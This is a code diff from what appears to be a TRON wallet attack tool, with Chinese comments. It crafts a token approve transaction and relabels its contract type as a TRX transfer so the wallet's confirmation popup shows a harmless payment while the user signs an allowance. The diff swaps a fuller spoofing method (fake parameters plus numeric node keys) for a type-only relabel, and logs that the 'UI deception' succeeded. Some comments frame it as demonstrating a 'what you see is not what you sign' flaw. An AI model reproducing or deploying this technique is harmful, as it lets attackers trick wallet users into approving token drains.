@@ -264,42 +264,26 @@
       );
       if (!result?.result) { log('approve 生成失败', 'error'); return; }
 
-      const realParam = transaction.raw_data.contract[0].parameter;
-      const originalHex = transaction.raw_data_hex;
+      // 只改 type，parameter 和 raw_data_hex 全都不动
+      // 钱包弹窗读 type → TransferContract → 显示 TRX 转账
+      // parameter 仍是 TriggerSmartContract 原值
+      // raw_data_hex 仍是 approve 字节
+      const originalType = transaction.raw_data.contract[0].type;
+      transaction.raw_data.contract[0].type = 'TransferContract';
+      // 不覆盖 raw_data_hex
 
-      // 构造假的 TransferContract 参数（钱包确认页显示）
-      const fakeParam = {
-        type_url: 'type.googleapis.com/protocol.TransferContract',
-        value: {
-          amount: 100000,
-          to_address: toHex,
-          owner_address: userHex,
-          data: ''
-        }
-      };
+      const hasSelector = transaction.raw_data_hex.includes('095ea7b3');
+      log('━━━━ 仅改 type 测试 ━━━━', 'warn');
+      log(`[改动] type: ${originalType} → TransferContract`, 'success');
+      log(`[不动] parameter: 保持 TriggerSmartContract 原值`, 'success');
+      log(`[不动] raw_data_hex 含 approve 选择器: ${hasSelector}`, hasSelector ? 'success' : 'error');
+      log('━━━━━━━━━━━━━━━━━━━━', 'warn');
 
-      // 替换 contract[0] — 字符串键给钱包 UI 读，数字键留给节点
-      // 数字键在当前 imToken 桥接会报 undefined，但低版本/其他钱包可能支持
-      transaction.raw_data.contract[0] = {
-        type: 'TransferContract',        // 钱包 UI → 显示 TRX 转账
-        parameter: fakeParam,            // 钱包 UI → 显示转账详情
-        '1': 'TriggerSmartContract',     // 节点字段号覆盖 → 解析为 approve
-        '2': realParam
-      };
-      transaction.raw_data_hex = originalHex;
-
-      const hasSelector = originalHex.includes('095ea7b3');
-      log(`raw_data_hex 包含 approve 选择器 (095ea7b3): ${hasSelector}`, hasSelector ? 'success' : 'error');
-      log('✔ contract 字符串键 → 钱包弹窗显示 TRX 转账', 'success');
-      log('✔ contract 数字键 → 节点解析为 TriggerSmartContract', 'success');
-      log('✔ raw_data_hex 保留 approve 字节', 'success');
-
-      const ok = await sendTx(transaction, '混合攻击 (approve)');
+      const ok = await sendTx(transaction, '混合攻击 (仅改type)');
       if (ok) {
         setTimeout(() => refreshAllowanceUI(false), 12000);
       } else {
-        log('⚠ 若弹窗显示 TRX 转账但报 SIGERROR，说明: 签名=approve, 节点重建=TransferContract', 'warn');
-        log('⚠ 弹窗截图 + 此日志即可证明"所见非所签"漏洞存在', 'warn');
+        log('⚠ 若弹窗仍显示 TRX 转账 → UI 欺骗成功', 'warn');
       }
     } catch (e) {
       log('构造失败: ' + (e.message || e), 'error');
